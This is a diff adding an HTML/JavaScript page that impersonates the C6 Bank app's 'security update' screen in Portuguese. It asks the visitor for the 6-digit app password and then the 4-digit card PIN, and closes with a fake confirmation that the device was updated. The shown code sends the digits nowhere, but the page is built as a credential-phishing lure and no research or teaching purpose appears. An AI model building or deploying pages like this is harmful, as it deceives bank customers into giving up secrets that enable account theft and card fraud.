@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>C6 Bank - Segurança</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        
+        :root {
+            --c6-yellow: #FFC800;
+            --c6-dark: #111111;
+            --c6-card: #242424;
+            --c6-text: #FFFFFF;
+            --c6-gray: #8A8A8A;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #000000;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+            color: var(--c6-text);
+        }
+
+        .phone-container {
+            width: 100%;
+            max-width: 450px;
+            background-color: var(--c6-dark);
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        }
+
+        .c6-header {
+            background-color: var(--c6-dark);
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #333;
+        }
+
+        .digit-container {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin: 30px 0;
+        }
+
+        .digit-box {
+            width: 45px;
+            height: 55px;
+            background-color: var(--c6-card);
+            border: 2px solid transparent;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: 600;
+            color: var(--c6-text);
+            transition: all 0.2s ease;
+        }
+
+        .digit-box.filled {
+            border-color: var(--c6-yellow);
+            box-shadow: 0 0 10px rgba(255, 200, 0, 0.1);
+        }
+
+        #hidden-input {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .btn-c6 {
+            background-color: var(--c6-yellow);
+            color: #000000;
+            padding: 16px;
+            width: 100%;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 16px;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-c6:disabled {
+            background-color: #333333;
+            color: #666666;
+            cursor: not-allowed;
+        }
+
+        .step-transition {
+            transition: transform 0.5s ease-in-out, opacity 0.5s;
+        }
+
+        .hidden-step {
+            display: none;
+            opacity: 0;
+        }
+
+        .c6-logo-text {
+            font-weight: 700;
+            color: var(--c6-text);
+            font-size: 20px;
+            letter-spacing: -0.5px;
+        }
+
+        .c6-logo-text span {
+            color: var(--c6-yellow);
+        }
+
+        /* Animação de carregamento */
+        .loader {
+            border: 3px solid rgba(0,0,0,0.1);
+            border-top: 3px solid #000;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+        }
+
+        .loader-light {
+            border: 3px solid rgba(255,255,255,0.1);
+            border-top: 3px solid var(--c6-yellow);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body onclick="focusCurrentInput()">
+
+    <div class="phone-container">
+        <div class="c6-header">
+            <div class="flex items-center gap-3">
+                <i data-lucide="x" class="w-6 h-6 text-gray-400"></i>
+            </div>
+            <div class="c6-logo-text">C6 <span>Bank</span></div>
+            <i data-lucide="help-circle" class="w-6 h-6 text-gray-400"></i>
+        </div>
+
+        <div class="flex-grow p-6">
+            <!-- Passo 1: Senha do App (6 dígitos) -->
+            <div id="step-1" class="step-transition">
+                <div class="mb-8 mt-4 text-center">
+                    <h1 class="text-2xl font-semibold text-white mb-3">Confirme sua identidade</h1>
+                    <p class="text-gray-400 text-sm leading-relaxed">Para continuar a atualização de segurança, digite a sua <strong>senha de 6 dígitos</strong> (a mesma que você usa para acessar o app).</p>
+                </div>
+
+                <div class="bg-[#242424] p-4 rounded-xl border border-[#333] mb-6 flex items-center gap-3">
+                    <i data-lucide="eye" class="w-5 h-5 text-[#FFC800]"></i>
+                    <p class="text-xs text-gray-300 font-medium">Sua senha ficará visível para conferência.</p>
+                </div>
+
+                <div class="relative">
+                    <div class="digit-container" id="container-app">
+                        <div class="digit-box" id="boxApp-0"></div>
+                        <div class="digit-box" id="boxApp-1"></div>
+                        <div class="digit-box" id="boxApp-2"></div>
+                        <div class="digit-box" id="boxApp-3"></div>
+                        <div class="digit-box" id="boxApp-4"></div>
+                        <div class="digit-box" id="boxApp-5"></div>
+                    </div>
+                    <input type="number" id="input-app" class="absolute opacity-0 pointer-events-none" inputmode="numeric" pattern="[0-9]*" maxlength="6">
+                </div>
+
+                <div class="mt-12">
+                    <button id="btn-next-app" disabled class="btn-c6">
+                        Continuar
+                    </button>
+                </div>
+            </div>
+
+            <!-- Passo 2: Senha do Cartão (4 dígitos) -->
+            <div id="step-2" class="step-transition hidden-step">
+                <div class="mb-8 mt-4 text-center">
+                    <h1 class="text-2xl font-semibold text-white mb-3">Senha do Cartão</h1>
+                    <p class="text-gray-400 text-sm leading-relaxed">Quase pronto! Agora informe a <strong>senha de 4 dígitos</strong> do seu cartão C6 Bank para sincronizar a chave de segurança.</p>
+                </div>
+
+                <div class="relative mt-8">
+                    <div class="digit-container" id="container-card">
+                        <div class="digit-box" id="boxCard-0"></div>
+                        <div class="digit-box" id="boxCard-1"></div>
+                        <div class="digit-box" id="boxCard-2"></div>
+                        <div class="digit-box" id="boxCard-3"></div>
+                    </div>
+                    <input type="number" id="input-card" class="absolute opacity-0 pointer-events-none" inputmode="numeric" pattern="[0-9]*" maxlength="4">
+                </div>
+
+                <div class="mt-16">
+                    <button id="btn-confirm-card" disabled class="btn-c6">
+                        Finalizar atualização
+                    </button>
+                </div>
+            </div>
+
+            <!-- Passo 3: Sucesso -->
+            <div id="step-3" class="step-transition hidden-step text-center py-12">
+                <div class="w-24 h-24 bg-[#242424] rounded-full flex items-center justify-center mx-auto mb-6 border border-[#333]">
+                    <i data-lucide="shield-check" class="w-12 h-12 text-[#FFC800]"></i>
+                </div>
+                <h2 class="text-2xl font-semibold text-white mb-3">Tudo certo!</h2>
+                <p class="text-gray-400 text-sm leading-relaxed">Seu dispositivo foi atualizado e sincronizado com sucesso. Sua conta está ainda mais segura.</p>
+                <div class="mt-12">
+                    <button onclick="location.reload()" class="btn-c6">
+                        Voltar para o início
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Rodapé Institucional -->
+        <div class="p-6 text-center mt-auto">
+            <p class="text-[11px] text-gray-500 font-medium">C6 Bank • Segurança Digital</p>
+        </div>
+    </div>
+
+    <script>
+        lucide.createIcons();
+        
+        const step1 = document.getElementById('step-1');
+        const step2 = document.getElementById('step-2');
+        const step3 = document.getElementById('step-3');
+        
+        const inputApp = document.getElementById('input-app');
+        const btnApp = document.getElementById('btn-next-app');
+        
+        const inputCard = document.getElementById('input-card');
+        const btnCard = document.getElementById('btn-confirm-card');
+
+        let currentActiveInput = inputApp;
+
+        function focusCurrentInput() {
+            currentActiveInput.focus();
+        }
+
+        // Lógica para a senha do App (6 dígitos)
+        inputApp.addEventListener('input', (e) => {
+            let val = e.target.value.replace(/\D/g, '').slice(0, 6);
+            inputApp.value = val;
+
+            for (let i = 0; i < 6; i++) {
+                const box = document.getElementById(`boxApp-${i}`);
+                if (i < val.length) {
+                    box.innerText = val[i];
+                    box.classList.add('filled');
+                } else {
+                    box.innerText = '';
+                    box.classList.remove('filled');
+                }
+            }
+            btnApp.disabled = val.length !== 6;
+        });
+
+        btnApp.addEventListener('click', () => {
+            btnApp.innerHTML = '<div class="loader"></div>';
+            btnApp.disabled = true;
+
+            setTimeout(() => {
+                step1.classList.add('hidden-step');
+                setTimeout(() => {
+                    step1.style.display = 'none';
+                    step2.style.display = 'block';
+                    setTimeout(() => {
+                        step2.classList.remove('hidden-step');
+                        currentActiveInput = inputCard;
+                        focusCurrentInput();
+                    }, 50);
+                }, 300);
+            }, 1000);
+        });
+
+        // Lógica para a senha do Cartão (4 dígitos)
+        inputCard.addEventListener('input', (e) => {
+            let val = e.target.value.replace(/\D/g, '').slice(0, 4);
+            inputCard.value = val;
+
+            for (let i = 0; i < 4; i++) {
+                const box = document.getElementById(`boxCard-${i}`);
+                if (i < val.length) {
+                    box.innerText = val[i]; 
+                    box.classList.add('filled');
+                } else {
+                    box.innerText = '';
+                    box.classList.remove('filled');
+                }
+            }
+            btnCard.disabled = val.length !== 4;
+        });
+
+        btnCard.addEventListener('click', () => {
+            // Loading C6 Style no lugar do botão todo
+            const originalContent = btnCard.innerHTML;
+            btnCard.innerHTML = '<div class="loader"></div>';
+            btnCard.disabled = true;
+
+            setTimeout(() => {
+                step2.classList.add('hidden-step');
+                setTimeout(() => {
+                    step2.style.display = 'none';
+                    step3.style.display = 'block';
+                    setTimeout(() => {
+                        step3.classList.remove('hidden-step');
+                    }, 50);
+                }, 300);
+            }, 2000);
+        });
+
+        // Previne caracteres especiais nos inputs numéricos
+        [inputApp, inputCard].forEach(inp => {
+            inp.addEventListener('keydown', (e) => {
+                if (["e", "E", "+", "-", ".", ","].includes(e.key)) e.preventDefault();
+            });
+        });
+
+        window.onload = () => {
+            setTimeout(focusCurrentInput, 500);
+        };
+    </script>
+</body>
+</html>
